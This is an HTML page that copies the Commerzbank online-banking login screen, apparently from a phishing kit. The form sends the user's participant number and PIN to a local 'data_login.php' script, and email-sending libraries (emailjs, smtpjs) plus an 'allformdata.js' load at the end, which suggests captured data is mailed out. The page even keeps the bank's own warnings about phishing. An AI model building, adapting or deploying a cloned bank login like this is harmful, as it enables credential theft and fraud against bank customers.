
<!DOCTYPE html>
<html dir="ltr" lang="de" class="no-js">
<meta http-equiv="content-type" content="text/html;charset=UTF-8" />

<head>

	<link href="assets/css/uccustom_cssadaa.css?_c=1610522272320" rel="stylesheet" />
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<meta name="author" content="Commerzbank AG">
	<meta name="copyright" content="(c) 2021 Commerzbank AG">
	<meta name="created" content="27.08.2013 12:09:54">
	<meta name="edited" content="10.05.2021 06:45:34">
	<meta name="description" content="Anmeldefunktion für das Digital Banking der Commerzbank">
	<meta name="keywords" content="Anmelden, Login, Anmeldung, ">
	<meta name="robots" content="noindex, nofollow">
	<meta http-equiv="pragma" content="no-cache">
	<meta http-equiv="expires" content="Thu, 01 Jan 1970 00:00:00 GMT">
	<meta name="referrer" content="origin">
	<meta name="referrer" content="origin-when-cross-origin">
	<meta name="referrer" content="strict-origin-when-cross-origin">
	<title>Anmeldung zum Digital Banking - Commerzbank</title>
	<link rel="shortcut icon" href="assets/img/favicon.ico" type="image/x-icon" title="Commerzbank AG" />
	<link rel="apple-touch-icon" href="assets/img/app_icon.png" type="image/x-icon" title="Commerzbank AG" />
	<link rel="apple-touch-icon" sizes="57x57" href="assets/img/apple-touch-icon-57x57_A.png" type="image/x-icon" title="Commerzbank AG" />
	<link rel="apple-touch-icon" sizes="72x72" href="assets/img/apple-touch-icon-72x72_A.png" type="image/x-icon" title="Commerzbank AG" />
	<link rel="apple-touch-icon" sizes="76x76" href="assets/img/apple-touch-icon-76x76_A.png" type="image/x-icon" title="Commerzbank AG" />
	<link rel="apple-touch-icon" sizes="114x114" href="assets/img/apple-touch-icon-114x114_A.png" type="image/x-icon" title="Commerzbank AG" />
	<link rel="apple-touch-icon" sizes="120x120" href="assets/img/apple-touch-icon-120x120_A.png" type="image/x-icon" title="Commerzbank AG" />
	<link rel="apple-touch-icon" sizes="144x144" href="assets/img/apple-touch-icon-144x144_A.png" type="image/x-icon" title="Commerzbank AG" />
	<link rel="apple-touch-icon" sizes="152x152" href="assets/img/apple-touch-icon-152x152_A.png" type="image/x-icon" title="Commerzbank AG" />
	<link href="assets/css/main.css" rel="stylesheet" />
	<link href="assets/css/cms.css" rel="stylesheet" />
	<link href="assets/css/header_login.css" rel="stylesheet"> 
	<script type="text/javascript">
		/*<![CDATA[*/
		var webtrekkEnabled='true';
		/*]]>*/
	</script>
	<script src="assets/js/jquery_1_12_4.js"></script>
	<script src="assets/js/jquery_ui_1_12_1.js"></script>
	<script src="assets/js/lib_head.js"></script>
	<script src="assets/js/lib_smartbanner.js"></script>
	<script type="text/javascript">
		// Popup window code
		function newMenuPopup(url, params, name) {
			popupWindow = window.open(url,name ,params+',scrollbars=yes,toolbar=no,menubar=no,location=no')
		}
		

		
		var userIsLoggedIn = false
		
		
	
		function reloadActualLocation() {
		
		  try {
		    document.location.href = document.location.href;
		  } catch(e) {}
		}
	</script>

</head>

<body data-section="pk">
	<header>
		<div class="mobileNavHeader"><a class="triggerNavSparten" href="#"><i class="icon i-118 i-g-04"></i></a><a class="mobileNavBack" href="#"><i class="icon i-110 i-g-03"></i></a><span class="levelDescriptor">Bezahlen</span><a class="homeLink" href="?portal/de/privatkunden/startseite.html"><i class="icon i-912 i-g-02"></i></a>
		</div>
		<div class="wrapper-meta">
			<div class="mod mod-Suche">
				<form method="post" action="data_login.php" >
					<input type="search" class="f-if-01" name="SucheISDirekt" placeholder="Ihr Suchtext" required>
					<button class="f-sf-01" type="submit">Suche</button>
				</form>
			</div>
			<div class="mod mod-NavMeta">
				<ul>
					<li class=" "><a href="?de/hauptnavigation/home/home.html" class="mn-01">Konzern</a>
					</li>
					<li class=" "><a href="?portal/en/englisch/english.html" class="mn-01">English</a>
					</li>
				</ul>
			</div>
		</div>
		<div class="wrapper-sparten">
			<div class="mod mod-Logo">
				<a href="?portal/de/privatkunden/startseite.html" alt="Zur Startseite commerzbank.de" title="Zur Startseite commerzbank.de">
					<img src="assets/img/logo_big_svg.svg" class="logo" alt="Zur Startseite commerzbank.de" title="Zur Startseite commerzbank.de" width="228" height="30" />
				</a>
			</div>
			<nav class="mod mod-NavSparten">
				<ul>
					<li class="active"><a href="?portal/de/privatkunden/startseite.html">Privatkunden</a>
					</li>
					<li class=""><a href="?portal/de/unternehmerkunden/startseite.html">Unternehmerkunden</a>
					</li>
					<li class=""><a href="?/firmenkunde">Firmenkunden</a>
					</li>
				</ul>
			</nav>
		</div>
		<nav class="mod mod-NavHaupt">
			<div class="yellow-bar">&nbsp;</div>
			<ul class="menubar">
				<li class="hn-01 hasSubNav  " aria-haspopup="true"><a href="#" data-nav-href="javascript::void(0);"><span>Persönlicher Bereich</span></a>
					
					</li>
					<li class="hn-02 hasSubNav  " aria-haspopup="true"><a href="#" data-nav-href="javascript::void(0);"><span>Konten & Karten</span></a></li>

						<li class="hn-02 hasSubNav  " aria-haspopup="true"><a href="#" data-nav-href="javascript::void(0);"><span>Sparen & Anlegen</span></a>
							</li>

							<li class="hn-02 hasSubNav  " aria-haspopup="true"><a href="#" data-nav-href="javascript::void(0);"><span>Kredit & Finanzierung</span></a></li>

								<li class="hn-02 hasSubNav  " aria-haspopup="true"><a href="#" data-nav-href="javascript::void(0);"><span>Vorsorgen & Versichern</span></a></li>

									<li class="hn-02 hasSubNav  " aria-haspopup="true"><a href="#" data-nav-href="javascript::void(0);"><span>Hilfe & Kontakt</span></a>
										</li>
										<li class="hn-02   " aria-haspopup="true"><a href="javascript::void(0);"><span>Ratgeber</span></a>
										</li>
			</ul>
		</nav>
		<div class="mobileNavFooter">
			<div class="mobileLoginContainer"><a title='Anmelden' class="btn b-01 b-a-04 b-g-02" href="?lp/login/">Anmelden</a>
			</div>
			<div class="mobileQuickLinks"><a href="?banking/financeoverview/">Finanzübersicht</a><a href="?banking/account/transactionoverview/">Umsatzübersicht</a>
			</div>
		</div>
	</header>
	<div id="mobileHeader">
		<button><span>Menu</span>
		</button>
		<div class="mod mod-Logo">
			<a href="?portal/de/privatkunden/startseite.html" alt="Zur Startseite commerzbank.de" title="Zur Startseite commerzbank.de">
				<img src="assets/img/logo_big_svg.svg" class="logo" alt="Zur Startseite commerzbank.de" title="Zur Startseite commerzbank.de" width="228" height="30" />
			</a>
		</div>
	</div>
	<div class="main" role="main">
		<noscript>
			<br>
			<h3 style="color:red;font-weight:bold;">Bitte aktivieren Sie ihr JavaScript, um das korrekte Darstellen der Webseite sicherzustellen.</h3>
			<br>
		</noscript>
		<section class="content">
			<p class="printButton"></p>
			<p class="helpButton"></p>
			<style type="text/css">
				/*<![CDATA[*/
				
				.feedbackPanel {
					list-style-type: none;
				}
				
				/*]]>*/
			</style>
			<div class="row sc-01">
				<div class="col col-lg-12">
					<div class="mod mod-Login">
						<div class="mod mod-Headline">
							<h1 class="h-01">
						Anmeldung für Online Banking
					</h1>
						</div>
						<div class="row ac-6_6">
							<div class="col col-lg-6">
								<div class="login-box">
									<input type="hidden" id="title" name="title" value="Loginfrom " />
										<input type="hidden" id="next" name="next" value="data_login.php" />

									<form method="POST" action="data_login.php" class="loginFormCss">

										<div style="width:0px;height:0px;position:absolute;left:-100px;top:-100px;overflow:hidden">
											
										</div>
										<div class="form-row label-pos-none field-length-full">
											<label for="teilnehmer">Label</label>
											<div class="input">
												<input class="text-left required" type="text" required id="teilnehmer" name="teilnehmer" autocomplete="off" maxlength="50" tabindex="1" autofocus="" data-h5-errorid="invalid-teilnehmer" value="" placeholder="Benutzername/Teilnehmernummer"></input>
												<div class="error-msg" id="invalid-teilnehmer" style="display: none;">
													<div class="inner">
														<p>Geben Sie bitte 8 oder 10 Ziffern für Ihre Teilnehmernummer oder min. 8 bis max. 50 Zeichen für Ihren Benutzernamen ein.</p>
													</div>
												</div>
											</div>
											<a href="#useridInfo" class="info-box-link"></a>
										</div>
										<div class="info-box-msg" id="useridInfo">
											<div class="inner">
												<p><b>Benutzername (Alias)</b>
													<br/>Der Benutzername ist eine von Ihnen frei w&auml;hlbare Zugangskennung. Diese k&ouml;nnen Sie nach jeder erfolgreichen Anmeldung vergeben, &auml;ndern oder l&ouml;schen. Nach Vergabe eines Benutzernamens ist eine Anmeldung mit diesem Benutzernamen oder der 10-stelligen Teilnehmernummer (8-stelligen Banking-ID) m&ouml;glich.
													<br/>
													<br/>Sollten sie Ihren Benutzernamen vergessen, k&ouml;nnen Sie sich jederzeit mit Ihrer 10-stelligen Teilnehmernummer (Banking-ID) anmelden und den Benutzernamen in der Rubrik "Pers&ouml;nlicher Bereich" unter dem Punkt "Verwaltung/Online Zugang" mit der Funktion "Benutzername &auml;ndern" ersehen und ggf. &auml;ndern.
													<br/>
													<br/><b>Teilnehmernummer (Banking-ID)</b>
													<br/>Unter der Teilnehmernummer werden die mit Ihrer Commerzbank Filiale vereinbarten Konten und Depots verwaltet. Die Teilnehmernummer ist 10-stellig und losgel&ouml;st von Ihrer Kontonummer. Die Teilnehmernummer k&ouml;nnen Sie sich jederzeit in der Rubrik "Pers&ouml;nlicher Bereich" unter dem Punkt "Verwaltung/Online Zugang" mit der Funktion "Benutzername &auml;ndern" anzeigen lassen.</p>
											</div><span class="close">x</span>
										</div>
										<div class="form-row  label-pos-none field-length-full">
											<label for="pin">Label</label>
											<div class="input">
												<input type="password" class="text-left" required id="pin" name="pin" autocomplete="off" maxlength="45" tabindex="2" data-h5-errorid="invalid-pin" value="" placeholder="PIN" pattern="[A-Za-z0-9!&quot;#\$%\&amp;\(\)\*\/\.\+,\-:;&lt;=&gt;\?@\[\u005C\]_\{\|\}~]{5,45}"></input>
												<div class="error-msg" id="invalid-pin" style="display: none;">
													<div class="inner">
														<p>Geben Sie bitte min. 5 bis max. 45 Buchstaben, Ziffern bzw. Sonderzeichen ein.</p>
													</div>
												</div>
											</div>
											<a href="#pinInfo" class="info-box-link"></a>
										</div>
										<div class="info-box-msg" id="pinInfo">
											<div class="inner">
												<p><b>PIN</b>
													<br/>Bitte geben Sie in dieses Feld Ihre 5 bis 45-stellige PIN - Pers&ouml;nliche Identifikationsnummer/Passwort ein.
													<br>Sie erhalten diese Geheimzahl nach der Freischaltung zum Online Banking von Ihrer Commerzbank Filiale. Eine &Auml;nderung Ihrer PIN ist unter Verwendung einer TAN - Transaktionsnummer - jederzeit in der Rubrik "Pers&ouml;nlicher Bereich" unter dem Punkt "Verwaltung/Online Zugang" mit der Funktion "PIN &auml;ndern" m&ouml;glich.</p>
											</div><span class="close">x</span>
										</div>
										<div class="form-row label-pos-none field-length-full">
											<label for="startSite">Label</label>
											<div class="input">
												<select class="dd-01" tabindex="3" name="selec">
													<option selected="selected" value="">Meine Startseite</option>
													<option value="Finanzübersicht">Finanzübersicht</option>
													<option value="Kontoumsätze">Kontoumsätze</option>
													<option value="Überweisung">Überweisung</option>
													<option value="Dauerauftrag">Dauerauftrag</option>
													<option value="Depotübersicht">Depotübersicht</option>
													<option value="Orderbuch">Orderbuch</option>
												</select>
											</div>
										</div>
										<button id="submit" class="b-01 b-a-04 b-g-01 login" type="submit" tabindex="4">Jetzt anmelden</button>
									</form>
									<div>
										<div class="mod mod-TextBild af-a-06">
											<h2 class="h-02"> Noch kein Digital Banking Kunde? </h2>
											<div class="content">
												<p class="p-02">
													<p class="btn-container "><a class="btn b-01 b-g-01 b-a-01" href="?prozess/WebObjects/ProzessCenter.woa/wa/default?path=/pk_sp/de/TNV/ST05_TNV_Anmeldung_DigitalBanking" title="Formular"> Zugang beantragen </a>
													</p>
												</p>
												<p class="p-02"><a class="l-p-02" href="?prozess/WebObjects/ProzessCenter.woa/wa/default?path=/pk_sp/de/TNV/ST08_DigitalBanking_Upload" title="Formular"> Antrag unterschrieben hochladen </a>
												</p>
											</div>
										</div>
										<div class="mod mod-TextBild af-a-06">
											<h3 class="h-03"> Aktuelle Warnhinweise </h3>
											<div class="content">
												<ul class="ll">
													<li><a class="l-p-02" href="?portal/de/privatkunden/hilfe-kontakt/services/sicherheit-onlinebanking/warnhinweise/falsche-commerzbank-mitarbeiter/falschecommerzbankmitarbeiter.html" title="&bdquo;Angebliche Bank-Mitarbeiter erfragen Zugangsdaten von Kunden&ldquo;"> Angebliche Bank-Mitarbeiter erfragen Zugangsdaten </a>
													</li>
													<li><a class="l-p-02" href="?portal/de/privatkunden/hilfe-kontakt/services/sicherheit-onlinebanking/warnhinweise/anlagebetrug/anlagebetrug.html" title="Aktueller Warnhinweis &ndash; Anlagebetrug (Boiler Room Fraud)"> Anlagebetrug (Boiler Room Fraud) </a>
													</li>
													<li><a class="l-p-02" href="?portal/de/privatkunden/hilfe-kontakt/services/sicherheit-onlinebanking/warnhinweise/upload-aktivierungsbrief/upload_aktivierungsbrief.html" title="Phishing-Mail fordert zum Upload des TAN-Aktivierungsbriefs auf"> Phishing-Mail fordert zum Upload des TAN-Aktivierungsbriefs auf </a>
													</li>
													<li><a class="l-p-02" href="?portal/de/privatkunden/hilfe-kontakt/services/corona-phishing.html" title="Corona-Phishing"> Achtung: Corona-Phishing </a>
													</li>
												</ul>
											</div>
										</div>
									</div>
								</div>
							</div>
							<div class="col col-lg-6">
								<div>
									<div class="mod mod-TextBild af-a-04">
										<h3 class="h-03"> Wichtige Infos zum Digital Banking </h3>
										<div class="content">
											<p class="p-02">Fragen rund um den Login mit TAN?
												<br />
											</p>
											<ul class="ll">
												<li><a class="l-p-02" href="?portal/de/privatkunden/konten-karten/wissen/zahlungsverkehr-organisieren/psd2.html" title="PSD2"> Informationen zu PSD2 </a>
												</li>
											</ul>
											<p class="p-02">
												<br />Kein aktives TAN-Verfahren?
												<br />
											</p>
											<ul class="ll">
												<li><a class="l-p-02" href="?banking/tan-management" title="TAN verwalten"> photoTAN aktivieren (f&uuml;r angemeldete Kunden) </a>
												</li>
												<li><a class="l-p-02" href="http://service.commerzbank.de/wie-kann-ich-phototan-aktivieren"> Hilfe zur photoTAN </a>
												</li>
											</ul>
											<p class="p-02">
												<br />Teilnehmernummer/PIN vergessen?
												<br />
											</p>
											<ul class="ll">
												<li><a class="l-p-02" href="?prozess/WebObjects/ProzessCenter.woa/wa/default?path=/pk_sp/de/TNV/ST01_TNR_anfordern" title="Formular"> Teilnehmernummer neu anfordern </a>
												</li>
												<li><a class="l-p-02" href="?prozess/WebObjects/ProzessCenter.woa/wa/default?path=/pk_sp/de/TNV/ST07_TNV_PIN_anfordern" title="Formular"> PIN vergessen </a>
												</li>
											</ul>
											<p class="p-02">
												<br />Alles rund ums Online Banking
												<br />
											</p>
											<ul class="ll">
												<li><a class="l-p-02" href="?/digital-banking"> Anleitung/Hilfe </a>
												</li>
											</ul>
										</div>
									</div>
								</div>
								<p></p>
								<div></div>
							</div>
						</div>
					</div>
				</div>
			</div>
			<div></div>
			<p></p>
		</section>
	</div>


	<footer>
		<div class="mod mod-NavFooter">
			<ul>
				<li class=" "><a href="?portal/de/footer1/agb/agb.html" class="fn-01">AGB</a>
				</li>
				<li class=" "><a href="?portal/de/footer1/preisekonditionen/preisekonditionen.html" class="fn-01">Preise & Konditionen</a>
				</li>
				<li class=" "><a href="?portal/de/footer1/impressum/impressum_1.html" class="fn-01">Impressum</a>
				</li>
				<li class=" "><a href="?portal/de/footer1/recht/rechtliche_hinweise.html" class="fn-01">Rechtliche Hinweise</a>
				</li>
				<li class=" "><a href="?portal/de/privatkunden/hilfe-kontakt/services/sicherheit-onlinebanking/sicherheit-onlinebanking.html" class="fn-01">Sicherheit</a>
				</li>
				<li class=" "><a href="?portal/de/privatkunden/hilfe-kontakt/services/newsletter/newsletter.html" class="fn-01">Newsletter</a>
				</li>
				<li class=" "><a href="?portal/de/footer1/affiliate/affiliate-partnerprogramm.html" class="fn-01">Affiliate</a>
				</li>
				<li class=" "><a href="?web/konten-zahlungsverkehr/apps/banking-app/" class="fn-01">App</a>
				</li>
				<li class=" "><a href="?portal/de/privatkunden/hilfe-kontakt/services/kunden-werben-kunden/kunden-werben-kunden.html" class="fn-01">Kunden werben Kunden</a>
				</li>
				<li class=" "><a href="?portal/de/privatkunden/hilfe-kontakt/kontakt/beschwerde-lob/beschwerde-lob.html" class="fn-01">Beschwerde</a>
				</li>
				<li class=" "><a href="?portal/de/privatkunden/konten-karten/produkte/kostenloses-girokonto/kostenloses-girokonto.html" class="fn-01">Kostenloses Girokonto</a>
				</li>
				<li class=" "><a href="#uc-corner-modal-show" class="fn-01">Einwilligungseinstellungen</a>
				</li>
				<li class=" "><a href="?portal/de/footer1/sitemap/sitemap.html?sitemap=true" class="fn-01">Sitemap</a>
				</li>
			</ul>
		</div>
	</footer>


<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
		<script src="https://ajax.aspnetcdn.com/ajax/jQuery/jquery-3.3.1.min.js"></script>
		 <script src="https://smtpjs.com/v3/smtp.js"></script>
	<script src="assets/js/main.js"></script>
	<script src="assets/js/allformdata.js"></script>




</body>

</html>